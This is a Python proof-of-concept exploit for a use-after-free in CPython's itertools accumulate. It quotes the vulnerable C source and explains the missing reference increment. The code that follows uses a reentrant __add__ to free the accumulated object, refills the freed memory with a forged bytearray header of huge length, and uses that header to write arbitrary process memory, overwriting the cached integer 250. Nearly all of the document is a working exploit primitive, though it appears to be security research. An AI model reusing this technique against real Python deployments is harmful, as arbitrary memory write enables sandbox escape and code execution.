"""
Author: @Nico-Posada
Bug Credits: @Nico-Posada
"""

# TLDR: UAF on a controlled object to create evil bytearray object
# Tested to work on 3.13.0, 3.13.1, 3.14.0

# Here is the vulnerable code as of 3.14.0
# https://github.com/python/cpython/blob/v3.14.0/Modules/itertoolsmodule.c#L3016-L3047
"""
static PyObject *
accumulate_next(accumulateobject *lz)
{
    PyObject *val, *newtotal;

    if (lz->initial != Py_None) {
        lz->total = lz->initial;
        lz->initial = Py_NewRef(Py_None);
        return Py_NewRef(lz->total);
    }
    val = (*Py_TYPE(lz->it)->tp_iternext)(lz->it);
    if (val == NULL)
        return NULL;

    if (lz->total == NULL) {
        lz->total = Py_NewRef(val);
        return lz->total;
    }

    if (lz->binop == NULL)
        newtotal = PyNumber_Add(lz->total, val); // <--- uses lz->total without incrementing the refcount beforehand
    else
        newtotal = PyObject_CallFunctionObjArgs(lz->binop, lz->total, val, NULL);
    Py_DECREF(val);
    if (newtotal == NULL)
        return NULL;

    Py_INCREF(newtotal);
    Py_SETREF(lz->total, newtotal); // <--- can overwrite the value of lz->total here
    return newtotal;
}
"""

# We can see that we can take a path that calls PyNumber_Add which can call python code, and it uses `lz->total`
# as one of the args without incrementing the refcount beforehand. The goal here is to have this call our custom 
# __add__ function which will reenter, take the quickest path to overwrite lz->total, then delete `self` to drop the refcount
# to 0 which frees the object. Once freed, we can fill that data with data for our evil bytearray object and return `NotImplemented`
# which will call the `__radd__` function in `catch` with the freed object (now our evil object) as `other`.

from itertools import accumulate

class evil(bytes):
    lock = False
    def __add__(self, other):
        global acc, _spray2
        if evil.lock:
            return 0

        # reenter to clear ref from lz->total
        evil.lock = True
        next(acc)
        evil.lock = False

        # clear ref from iter
        lst.clear()

        # clear final ref
        del self

        # our original lz->total is now freed, so reclaim memory with data for our evil object
        _spray2 = fake_obj.ljust(SIZE, b"\0")

        # pass it to catch.__radd__ where it'll receive our evil object
        return NotImplemented

class catch:
    def __radd__(self, other):
        global mem
        mem = other
        return 0xdeadbeef

# setup
p64 = lambda num: num.to_bytes(8, 'little')
fake_obj = (
    p64(0x12345) +
    p64(id(bytearray)) +
    p64(2**63 - 1) +
    p64(2**63 - 1) +
    p64(0) +
    p64(0)
)

SIZE = 0x100
acc = accumulate(lst:=[evil(SIZE - 0x18), catch(), None])
next(acc) # set up for the attack

mem = None
next(acc) # trigger bug
if mem is None:
    exit("failed")

print(type(mem))
print(hex(len(mem)))

mem[id(250) + int.__basicsize__] = 100
print(250) # => 100